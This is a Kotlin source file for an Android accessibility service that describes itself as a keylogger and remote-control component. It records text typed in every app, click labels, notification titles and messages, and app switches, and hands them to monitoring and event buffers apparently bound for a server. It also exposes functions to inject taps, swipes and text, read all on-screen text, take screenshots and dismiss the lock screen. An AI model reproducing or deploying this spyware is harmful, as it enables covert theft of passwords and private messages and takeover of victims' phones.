package com.abuzahra.manager.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.app.Notification
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Bundle
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.abuzahra.manager.executor.MonitorExecutor
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * MyAccessibilityService - Complete Implementation
 * Provides screen reading, keylogger, automated UI interactions, and gesture injection
 */
class MyAccessibilityService : AccessibilityService() {

    companion object {
        private var instance: MyAccessibilityService? = null
        private val keyloggerEnabled = java.util.concurrent.atomic.AtomicBoolean(false)
        private val autoClickEnabled = java.util.concurrent.atomic.AtomicBoolean(false)
        private val notificationInterceptEnabled = java.util.concurrent.atomic.AtomicBoolean(false)
        
        // Gesture results
        @Volatile private var gestureResult: Boolean = false
        private var gestureLatch: CountDownLatch? = null

        fun getInstance(): MyAccessibilityService? = instance

        fun isEnabled(context: android.content.Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val serviceName = "${context.packageName}/${MyAccessibilityService::class.java.canonicalName}"
            return enabledServices.contains(serviceName) || enabledServices.contains(context.packageName)
        }
        
        fun setKeyloggerEnabled(enabled: Boolean) {
            keyloggerEnabled.set(enabled)
        }
        
        fun isKeyloggerEnabled(): Boolean = keyloggerEnabled.get()
        
        fun setAutoClickEnabled(enabled: Boolean) {
            autoClickEnabled.set(enabled)
        }
        
        fun setNotificationInterceptEnabled(enabled: Boolean) {
            notificationInterceptEnabled.set(enabled)
        }
    }

    // Event statistics
    private var eventCount = 0L
    private var textEventCount = 0L
    private var clickEventCount = 0L
    private var notificationEventCount = 0L
    private var startTime = System.currentTimeMillis()
    
    // Last captured data
    private var lastCapturedText = StringBuilder()
    private var currentApp = ""
    private var lastEventType = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        // Configure the service with comprehensive settings
        val info = AccessibilityServiceInfo().apply {
            // Listen to only the needed event types to reduce battery drain
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            
            // Feedback type
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            
            // Comprehensive flags
            flags = AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE or
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            
            // Short notification timeout for responsiveness
            notificationTimeout = 50
            
            // Listen to all packages
            packageNames = null
            
            // Additional capabilities are configured in accessibility_service_config.xml
            // (canPerformGestures, canRetrieveWindowContent, etc.)
        }
        serviceInfo = info

        // Notify server that accessibility is enabled
        com.abuzahra.manager.EventBuffer.addEvent(
            "accessibility_enabled",
            mapOf(
                "status" to "connected",
                "service" to "MyAccessibilityService"
            )
        )
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        
        eventCount++
        val packageName = event.packageName?.toString() ?: "unknown"
        
        when (event.eventType) {
            // Text changed events - KEYLOGGER
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextChangeEvent(event, packageName)
            }
            
            // Text selection events
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                handleTextSelectionEvent(event, packageName)
            }
            
            // Click events
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handleClickEvent(event, packageName)
            }
            
            // Focus events
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                handleFocusEvent(event, packageName)
            }
            
            // Notification events
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                handleNotificationEvent(event, packageName)
            }
            
            // Window state changed (app switches)
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowStateChangeEvent(event, packageName)
            }
            
            // Window content changed
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                handleWindowContentChangeEvent(event, packageName)
            }
            
            // View scrolled
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                // Usually not needed for keylogger
            }
            
            // Gesture events (Android 8+)
            AccessibilityEvent.TYPE_GESTURE_DETECTION_START -> {
                // Could track gestures
            }
            
            else -> {
                // Other events
            }
        }
    }

    private fun handleTextChangeEvent(event: AccessibilityEvent, packageName: String) {
        if (!keyloggerEnabled.get()) return

        textEventCount++
        
        try {
            // Get the text from the event
            val text = event.text?.joinToString("") ?: ""
            val fromIndex = event.fromIndex
            val addedCount = event.addedCount
            val removedCount = event.removedCount
            val beforeText = event.beforeText?.toString() ?: ""
            
            // Get the source node for more details
            val source = event.source
            val viewId = source?.viewIdResourceName ?: ""
            val className = source?.className?.toString() ?: ""
            val description = source?.contentDescription?.toString() ?: ""
            
            // Build the captured data
            val capturedText = buildString {
                if (text.isNotEmpty()) {
                    append(text)
                }
                if (beforeText.isNotEmpty() && text.isNotEmpty() && beforeText != text) {
                    // Text was modified
                    append("[EDIT]")
                }
            }
            
            if (capturedText.isNotEmpty()) {
                // Update last captured
                lastCapturedText.append(capturedText)
                if (lastCapturedText.length > 10000) {
                    lastCapturedText = StringBuilder(lastCapturedText.takeLast(5000))
                }
                
                // Send to MonitorExecutor
                MonitorExecutor.appendKeylog(
                    packageName = packageName,
                    text = capturedText,
                    viewType = "text_change"
                )
                
                // Also log with context
                logKeyEvent(
                    packageName = packageName,
                    text = capturedText,
                    viewId = viewId,
                    className = className
                )
            }
            
            source?.recycle()
        } catch (e: Exception) {
            // Log error but don't crash
        }
    }
    
    private fun handleTextSelectionEvent(event: AccessibilityEvent, packageName: String) {
        // Could be used to track what text user selected
    }

    private fun handleClickEvent(event: AccessibilityEvent, packageName: String) {
        clickEventCount++
        lastEventType = "click"
        
        if (!keyloggerEnabled.get()) return
        
        try {
            val text = event.text?.joinToString("") ?: ""
            val contentDescription = event.contentDescription?.toString() ?: ""
            val source = event.source
            
            val viewId = source?.viewIdResourceName ?: ""
            val className = source?.className?.toString() ?: ""
            
            val clickText = buildString {
                if (text.isNotEmpty()) append(text)
                if (contentDescription.isNotEmpty()) {
                    if (isNotEmpty()) append(" | ")
                    append(contentDescription)
                }
            }
            
            if (clickText.isNotEmpty()) {
                MonitorExecutor.appendKeylog(
                    packageName = packageName,
                    text = "[CLICK:$clickText]",
                    viewType = "click"
                )
            }
            
            source?.recycle()
        } catch (_: Exception) {}
    }
    
    private fun handleFocusEvent(event: AccessibilityEvent, packageName: String) {
        // Track which view has focus - useful for keylogger context
    }
    
    private fun handleNotificationEvent(event: AccessibilityEvent, packageName: String) {
        notificationEventCount++
        
        if (!notificationInterceptEnabled.get() && !keyloggerEnabled.get()) return
        
        try {
            val text = event.text?.joinToString("\n") ?: ""
            val tickerText = event.text?.joinToString() ?: ""
            
            // For notifications, try to get more data from the Parcelable
            val parcelableData = event.parcelableData
            
            var title = ""
            var message = ""
            var category = ""
            
            if (parcelableData is Notification) {
                val notification = parcelableData
                title = notification.extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
                message = notification.extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
                category = notification.category ?: ""
                
                // Add to notification history
                MonitorExecutor.addNotification(packageName, title, message, category)
            }
            
            // Log notification if keylogger is active
            if (keyloggerEnabled.get()) {
                val notifText = buildString {
                    if (title.isNotEmpty()) append("[$title] ")
                    if (message.isNotEmpty()) append(message)
                    if (text.isNotEmpty() && text != message) append(" | $text")
                }
                
                if (notifText.isNotEmpty()) {
                    MonitorExecutor.appendKeylog(
                        packageName = packageName,
                        text = "[NOTIF:$notifText]",
                        viewType = "notification"
                    )
                }
            }
        } catch (_: Exception) {}
    }
    
    private fun handleWindowStateChangeEvent(event: AccessibilityEvent, packageName: String) {
        // App switch or activity change
        val className = event.className?.toString() ?: ""
        val text = event.text?.joinToString("") ?: ""
        
        if (packageName != currentApp) {
            currentApp = packageName
            
            // Log app switch if keylogger active
            if (keyloggerEnabled.get()) {
                MonitorExecutor.appendKeylog(
                    packageName = packageName,
                    text = "[APP:$packageName]",
                    viewType = "app_switch"
                )
            }
        }
    }
    
    private fun handleWindowContentChangeEvent(event: AccessibilityEvent, packageName: String) {
        // Content changed in current window
        // Useful for detecting dynamic content updates
    }

    private fun logKeyEvent(packageName: String, text: String, viewId: String, className: String) {
        com.abuzahra.manager.EventBuffer.addEvent(
            "key_event",
            mapOf(
                "package" to packageName,
                "text" to text.take(500),
                "view_id" to viewId,
                "class" to className
            )
        )
    }

    override fun onInterrupt() {
        com.abuzahra.manager.EventBuffer.addEvent(
            "accessibility_interrupted",
            mapOf("timestamp" to System.currentTimeMillis())
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        keyloggerEnabled.set(false)
        autoClickEnabled.set(false)
        
        // Buffer event locally
        com.abuzahra.manager.EventBuffer.addEvent(
            "accessibility_destroyed",
            mapOf("status" to "disconnected")
        )
    }

    // ===== AUTOMATED ACTIONS =====

    /**
     * Click on a node by its text
     */
    fun clickOnText(text: String, exactMatch: Boolean = false): Boolean {
        val root = rootInActiveWindow ?: return false
        
        val nodes = if (exactMatch) {
            root.findAccessibilityNodeInfosByText(text)
                .filter { it.text?.toString() == text }
        } else {
            root.findAccessibilityNodeInfosByText(text)
        }
        
        try {
            for (node in nodes) {
                val clicked = performClickOnNode(node)
                if (clicked) return true
            }
            return false
        } finally {
            // Recycle all nodes to prevent memory leaks
            for (node in nodes) {
                if (node != null) node.recycle()
            }
        }
    }

    /**
     * Click on a node by its view ID
     */
    fun clickOnViewId(viewId: String): Boolean {
        val root = rootInActiveWindow ?: return false
        
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        try {
            for (node in nodes) {
                val clicked = performClickOnNode(node)
                if (clicked) return true
            }
            return false
        } finally {
            // Recycle all nodes to prevent memory leaks
            for (node in nodes) {
                if (node != null) node.recycle()
            }
        }
    }
    
    /**
     * Click on node at specific coordinates
     */
    fun clickAt(x: Int, y: Int): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return false
        }
        
        val path = Path().apply {
            moveTo(x.toFloat(), y.toFloat())
        }
        
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
            .build()
        
        // Use local latch/result to avoid race conditions between concurrent calls
        val localLatch = CountDownLatch(1)
        val localResult = AtomicBoolean(false)
        
        val dispatched = dispatchGesture(gesture, object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                localResult.set(true)
                localLatch.countDown()
            }
            
            override fun onCancelled(gestureDescription: GestureDescription?) {
                localResult.set(false)
                localLatch.countDown()
            }
        }, null)
        
        if (dispatched) {
            localLatch.await(2, TimeUnit.SECONDS)
        }
        
        return localResult.get()
    }
    
    /**
     * Swipe gesture
     */
    fun swipe(startX: Int, startY: Int, endX: Int, endY: Int, durationMs: Long = 300): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return false
        }
        
        val path = Path().apply {
            moveTo(startX.toFloat(), startY.toFloat())
            lineTo(endX.toFloat(), endY.toFloat())
        }
        
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
            .build()
        
        // Use local latch/result to avoid race conditions between concurrent calls
        val localLatch = CountDownLatch(1)
        val localResult = AtomicBoolean(false)
        
        val dispatched = dispatchGesture(gesture, object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                localResult.set(true)
                localLatch.countDown()
            }
            
            override fun onCancelled(gestureDescription: GestureDescription?) {
                localResult.set(false)
                localLatch.countDown()
            }
        }, null)
        
        if (dispatched) {
            localLatch.await(2, TimeUnit.SECONDS)
        }
        
        return localResult.get()
    }
    
    /**
     * Type text into a focused input field
     */
    fun typeText(text: String): Boolean {
        val root = rootInActiveWindow ?: return false
        
        // Find focused node or editable node
        val editNodes = root.findAccessibilityNodeInfosByViewId("android:id/edit")
        val editNode = editNodes.firstOrNull()
        // Recycle unused edit nodes (keep the one we'll use)
        for (node in editNodes) {
            if (node !== editNode) node.recycle()
        }

        val textNodes = if (editNode != null) emptyList() else root.findAccessibilityNodeInfosByText("")
        val editableNode = textNodes.firstOrNull { it.isEditable }
        // Recycle unused text search nodes
        for (node in textNodes) {
            if (node !== editableNode) node.recycle()
        }

        val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            ?: editNode
            ?: editableNode

        if (focusedNode == null) return false
        
        // Try to set text directly
        val arguments = Bundle()
        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
        val result = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
        
        focusedNode.recycle()
        return result
    }
    
    /**
     * Scroll in a direction
     */
    fun scroll(direction: ScrollDirection): Boolean {
        val root = rootInActiveWindow ?: return false
        
        val action = when (direction) {
            ScrollDirection.UP -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
            ScrollDirection.DOWN -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
            ScrollDirection.LEFT -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
            ScrollDirection.RIGHT -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
        }
        
        // Find scrollable node
        val scrollableNode = findScrollableNode(root, direction) ?: return false
        val result = scrollableNode.performAction(action)
        scrollableNode.recycle()
        
        return result
    }
    
    private fun findScrollableNode(node: AccessibilityNodeInfo, direction: ScrollDirection): AccessibilityNodeInfo? {
        if (node.isScrollable) return node
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findScrollableNode(child, direction)
            if (result != null) return result
            child.recycle()
        }
        
        return null
    }
    
    /**
     * Get all text from current screen
     */
    fun getAllText(): String {
        val root = rootInActiveWindow ?: return ""
        val textBuilder = StringBuilder()
        
        extractTextFromNode(root, textBuilder)
        
        return textBuilder.toString()
    }
    
    private fun extractTextFromNode(node: AccessibilityNodeInfo, builder: StringBuilder) {
        val text = node.text?.toString()
        if (!text.isNullOrBlank()) {
            builder.append(text).append("\n")
        }
        
        val contentDesc = node.contentDescription?.toString()
        if (!contentDesc.isNullOrBlank() && contentDesc != text) {
            builder.append(contentDesc).append("\n")
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            extractTextFromNode(child, builder)
            child.recycle()
        }
    }
    
    /**
     * Find node containing specific text
     */
    fun findNodeByText(text: String): AccessibilityNodeInfo? {
        val root = rootInActiveWindow ?: return null
        val nodes = root.findAccessibilityNodeInfosByText(text)
        val result = nodes.firstOrNull()
        // Recycle all other nodes to prevent memory leaks
        for (node in nodes) {
            if (node !== result) node.recycle()
        }
        return result
    }
    
    /**
     * Get node bounds
     */
    fun getNodeBounds(node: AccessibilityNodeInfo): Rect {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        return bounds
    }
    
    /**
     * Long press on a node
     */
    fun longPress(node: AccessibilityNodeInfo): Boolean {
        return node.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK)
    }
    
    /**
     * Long press at coordinates
     */
    fun longPressAt(x: Int, y: Int): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return false
        }
        
        val path = Path().apply {
            moveTo(x.toFloat(), y.toFloat())
        }
        
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 500))
            .build()
        
        return dispatchGesture(gesture, null, null)
    }

    private fun performClickOnNode(node: AccessibilityNodeInfo): Boolean {
        // Try direct click
        if (node.isClickable) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        
        // Try parent click
        var parent = node.parent
        while (parent != null) {
            if (parent.isClickable) {
                val clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                parent.recycle()
                return clicked
            }
            val grandParent = parent.parent
            parent.recycle()
            parent = grandParent
        }
        
        // Try click via coordinates
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val bounds = Rect()
            node.getBoundsInScreen(bounds)
            return clickAt(bounds.centerX(), bounds.centerY())
        }
        
        return false
    }

    // ===== GLOBAL ACTIONS =====

    fun goBack(): Boolean = performGlobalAction(GLOBAL_ACTION_BACK)

    fun goHome(): Boolean = performGlobalAction(GLOBAL_ACTION_HOME)

    fun openRecents(): Boolean = performGlobalAction(GLOBAL_ACTION_RECENTS)

    fun openNotifications(): Boolean = performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)

    fun openQuickSettings(): Boolean = performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)

    fun openPowerDialog(): Boolean = performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)

    fun lockScreen(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
        } else {
            false
        }
    }

    fun takeScreenshot(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT)
        } else {
            false
        }
    }
    
    fun accessibilityButton(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            performGlobalAction(GLOBAL_ACTION_ACCESSIBILITY_BUTTON)
        } else {
            false
        }
    }
    
    fun accessibilityShortcut(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            performGlobalAction(GLOBAL_ACTION_ACCESSIBILITY_SHORTCUT)
        } else {
            false
        }
    }
    
    fun accessibilityAllApps(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            performGlobalAction(GLOBAL_ACTION_ACCESSIBILITY_ALL_APPS)
        } else {
            false
        }
    }
    
    fun dismissNotificationShade(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE)
        } else {
            goBack()
        }
    }

    /**
     * Attempt to dismiss the keyguard by performing a swipe-up gesture.
     * Only works for devices without PIN/pattern/password lock.
     */
    fun dismissKeyguard(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val displayMetrics = resources.displayMetrics
                val screenHeight = displayMetrics.heightPixels.toFloat()
                val screenWidth = displayMetrics.widthPixels / 2f
                val path = android.graphics.Path().apply {
                    moveTo(screenWidth, screenHeight * 0.8f)
                    lineTo(screenWidth, screenHeight * 0.2f)
                }
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, 300))
                    .build()
                dispatchGesture(gesture, object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription) {
                        android.util.Log.i("MyAccessibilityService", "Keyguard dismiss gesture completed")
                    }
                    override fun onCancelled(gestureDescription: GestureDescription) {
                        android.util.Log.w("MyAccessibilityService", "Keyguard dismiss gesture cancelled")
                    }
                }, null)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            android.util.Log.e("MyAccessibilityService", "dismissKeyguard failed", e)
            false
        }
    }

    // ===== STATISTICS =====
    
    fun getStats(): Map<String, Any> {
        return mapOf(
            "uptime_ms" to (System.currentTimeMillis() - startTime),
            "total_events" to eventCount,
            "text_events" to textEventCount,
            "click_events" to clickEventCount,
            "notification_events" to notificationEventCount,
            "keylogger_enabled" to keyloggerEnabled.get(),
            "auto_click_enabled" to autoClickEnabled.get(),
            "current_app" to currentApp,
            "last_event_type" to lastEventType,
            "captured_text_length" to lastCapturedText.length
        )
    }

    enum class ScrollDirection {
        UP, DOWN, LEFT, RIGHT
    }
}
